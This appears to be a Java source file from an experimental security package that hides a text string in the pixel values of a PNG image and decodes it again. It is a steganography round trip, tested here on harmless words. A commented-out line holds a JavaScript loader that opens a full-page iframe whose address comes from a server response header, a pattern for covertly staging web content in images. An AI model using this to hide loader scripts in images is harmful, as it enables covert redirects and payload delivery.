package security.incubator;

import java.awt.Color;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.awt.image.DataBuffer;
import java.awt.image.DataBufferByte;
import java.awt.image.DataBufferInt;
import java.awt.image.WritableRaster;
import java.io.File;
import java.io.IOException;
import java.util.Arrays;

import javax.imageio.ImageIO;

public class ImageUtilV0 {

	/**
	 * 
	 * @param pixels
	 * @param width
	 * @param height
	 * @return
	 */
	public static BufferedImage getImageFromArray(int[] pixels, int width, int height) {
		BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
		WritableRaster raster = (WritableRaster) image.getData();
		raster.setPixels(0, 0, width, height, pixels);
		image.setData(raster);
		return image;
	}

	/**
	 * 
	 * @param content
	 * @param index
	 * @return
	 */
	protected static int toAscii(String content, int index) {
		int ascii = content.charAt(index);
		return ascii;
	}

	/****
	 *
	 * @param content
	 * @return
	 */
	public static BufferedImage encode(String content) {
		System.out.println("encode()");
		// System.out.println(" content=" + content);

		int pixelNum = content.length() / 4;
		int remain = content.length() % 4;
		if (remain > 0) {
			pixelNum += 1;
		}

		int[] inputArray = new int[pixelNum * 4];
		int j = 0;
		for (int i = 0; i < pixelNum; i++) {
			if (i < pixelNum - 1 || remain == 0) {
				int a = toAscii(content, i * 4 + 0);
				int r = toAscii(content, i * 4 + 1);
				int g = toAscii(content, i * 4 + 2);
				int b = toAscii(content, i * 4 + 3);

				System.out.println("  a, r, g, b=" + a + "," + r + "," + g + "," + b);

				inputArray[j++] = b;
				inputArray[j++] = g;
				inputArray[j++] = r;
				inputArray[j++] = a;

			} else {
				int a = (remain >= 1) ? toAscii(content, i * 4 + 0) : 0;
				int r = (remain >= 2) ? toAscii(content, i * 4 + 1) : 0;
				int g = (remain >= 3) ? toAscii(content, i * 4 + 2) : 0;
				int b = 0;

				System.out.println("  a, r, g, b=" + a + "," + r + "," + g + "," + b);

				inputArray[j++] = b;
				inputArray[j++] = g;
				inputArray[j++] = r;
				inputArray[j++] = a;
			}
		}

		return getImageFromArray(inputArray, 1, pixelNum);
	}

	public static String decode(Image image) {
		System.out.println("decode()");
		// byte[] pixels = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
		byte[] bytes = null;
		int[] pixels = null;
		if (image instanceof BufferedImage) {
			BufferedImage bufferedImage = (BufferedImage) image;
			// int width = bufferedImage.getWidth();
			// int height = bufferedImage.getHeight();
			WritableRaster raster = bufferedImage.getRaster();
			if (raster != null) {
				DataBuffer buffer = raster.getDataBuffer();
				if (buffer instanceof DataBufferByte) {
					bytes = ((DataBufferByte) buffer).getData();
				}
				if (buffer instanceof DataBufferInt) {
					pixels = ((DataBufferInt) buffer).getData();
				}
			}
		}

		String content = "";
		if (bytes != null) {
			System.out.println("  bytes.length = " + bytes.length);
			for (byte b : bytes) {
				content += String.valueOf((char) b);
			}

		} else if (pixels != null) {
			System.out.println("  pixels.length = " + pixels.length);

			for (int pixel : pixels) {
				int a = (pixel >> 24) & 0xff;
				int r = (pixel >> 16) & 0xff;
				int g = (pixel >> 8) & 0xff;
				int b = (pixel >> 0) & 0xff;

				System.out.println("  a, r, g, b=" + a + "," + r + "," + g + "," + b);

				content += String.valueOf((char) a);
				content += String.valueOf((char) b);
				content += String.valueOf((char) g);
				content += String.valueOf((char) r);
			}
		}

		content = content.trim();
		return content;
	}

	public byte[] getBytes(final int width, final int height, final int sx, final int sy) {
		final byte[] array = new byte[width * height * 4];
		int index = 0;
		for (int x = 0; x < width; x++) {
			for (int y = 0; y < height; y++) {
				// final Color c = new Color(image_.getRGB(sx + x, sy + y), true);
				Color c = null;
				array[index++] = (byte) c.getRed();
				array[index++] = (byte) c.getGreen();
				array[index++] = (byte) c.getBlue();
				array[index++] = (byte) c.getAlpha();
			}
		}
		return array;
	}

	public static void main(String[] args) {
		String content1 = "Hello World";
		content1 = "word";
		content1 += "ball";
		content1 += "game";
		// content1 = "var a=document;var b=window;var yl=a.createElement(\"style\");yl.type=\"text/css\";var h=a.head||a.getElementsByTagName(\"head\")[0];h.appendChild(yl);var
		// cs=\"body{margin:0;overflow:hidden;}\";if(yl.styleSheet){yl.styleSheet.cssText=cs;}else{yl.appendChild(a.createTextNode(cs));}var f=a.createElement(\"iframe\");f.setAttribute(\"id\", \"x\");f.setAttribute(\"frameborder\", \"0\");a.body.appendChild(f);var
		// u=a.URL;functionc(){a.getElementById(\"x\").width=(b.innerWidth||a.documentElement.clientWidth||a.body.clientWidth);a.getElementById(\"x\").height=(b.innerHeight||a.documentElement.clientHeight||a.body.clientHeight);}function
		// l(){c();}functions(){c();}b.addEventListener(\"load\",l);b.addEventListener(\"resize\",s);var r=new XMLHttpRequest();r.open(\"HEAD\",u,true);r.onreadystatechange=function(){if(r.readyState==4){a.getElementById(\"x\").src=r.getResponseHeader(\"s\");}};r.send();";

		// String content1 = "word";
		System.out.println("content1=" + content1);
		BufferedImage image1 = encode(content1);

		String path = System.getProperty("user.dir");
		File file = new File(path + "/doc/bg1.png");
		try {
			if (file.exists()) {
				file.delete();
			}
			ImageIO.write(image1, "png", file);
		} catch (IOException e) {
			e.printStackTrace();
		}

		System.out.println("Format names: " + Arrays.toString(ImageIO.getReaderFormatNames()));

		BufferedImage image2 = null;
		try {
			image2 = ImageIO.read(file);

		} catch (IOException e) {
			e.printStackTrace();
		}

		String content2 = decode(image2);
		System.out.println("content2=" + content2);
		System.out.println("content1.equals(content2)=" + content1.equals(content2));
	}

}

/// **
// *
// * @param content
// * @return
// */
// public static Image encode(String content) {
// System.out.println("encode()");
// System.out.println(" content=" + content);
//
// int size = content.length() / 4;
// int remain = content.length() % 4;
// if (remain > 0) {
// size += 1;
// }
// int[] pixels = new int[size];
//
// for (int i = 0; i < size; i++) {
// int argb = 0;
// if (i < size - 1 || remain == 0) {
// int a = Character.getNumericValue(content.charAt(i * 4 + 0));
// int r = Character.getNumericValue(content.charAt(i * 4 + 1));
// int g = Character.getNumericValue(content.charAt(i * 4 + 2));
// int b = Character.getNumericValue(content.charAt(i * 4 + 3));
//
// // ARGB = A<<24 + R<<16 + G<<8 + B
// argb = (a << 24) + (r << 16) + (g << 8) + b;
//
// } else {
// int a = Character.getNumericValue(content.charAt(i * 4 + 0));
// int r = (remain >= 2) ? Character.getNumericValue(content.charAt(i * 4 + 1)) : 0;
// int g = (remain >= 3) ? Character.getNumericValue(content.charAt(i * 4 + 2)) : 0;
// int b = 0;
//
// argb = (a << 24) + (r << 16) + (g << 8) + b;
// }
// pixels[i] = argb;
// }
//
// System.out.println("pixels.length=" + pixels.length);
//
// return getImageFromArray(pixels, 1, 3);
// }

// int a = (pixel & 0xff000000) << 24;
// int r = (pixel & 0xff0000) << 16;
// int g = (pixel & 0xff00) << 8;
// int b = (pixel & 0xff);

// System.out.println("inputArray.length=" + inputArray.length);

// int[] inputArray2 = new int[inputArray.length + 8];
// inputArray2[0] = 2;
// inputArray2[1] = 2;
// inputArray2[2] = 2;
// inputArray2[3] = 2;
//
// System.arraycopy(inputArray, 0, inputArray2, 4, inputArray.length);
//
// inputArray2[inputArray2.length - 4] = 3;
// inputArray2[inputArray2.length - 3] = 3;
// inputArray2[inputArray2.length - 2] = 3;
// inputArray2[inputArray2.length - 1] = 3;
